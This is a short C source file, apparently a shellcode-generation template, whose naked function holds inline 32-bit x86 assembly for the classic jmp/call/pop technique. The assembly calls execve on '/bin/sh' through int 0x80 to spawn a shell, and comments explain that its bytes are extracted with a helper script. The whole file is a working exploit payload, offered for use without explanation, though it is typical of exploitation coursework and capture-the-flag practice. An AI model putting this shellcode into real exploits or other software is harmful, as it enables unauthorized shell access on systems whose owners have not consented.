__attribute__((naked)) void shellcode(void)
//put shellcode instructions in the __asm__() part, then run ./makeshellcode.sh
//the bytes are generated from the shellcode() symbol, so the function body should end in ret
{
  __asm__ (
    "jmp get_string;"
    "run_shell:"
    "pop %ebx;"
    "xor %eax, %eax;"
    "movb %al, 7(%ebx);"
    "movl %ebx, 8(%ebx);"
    "movl %eax, 12(%ebx);"
    "movb $0x0b, %al;"
    "leal 8(%ebx), %ecx;"
    "leal 12(%ebx), %edx;"
    "int $0x80;"
    "ret;"
    "get_string:"
    "call run_shell;"
    ".ascii \"/bin/shXAAAABBBB\";"
  );
}

int main(void)
{
  return 0;
}
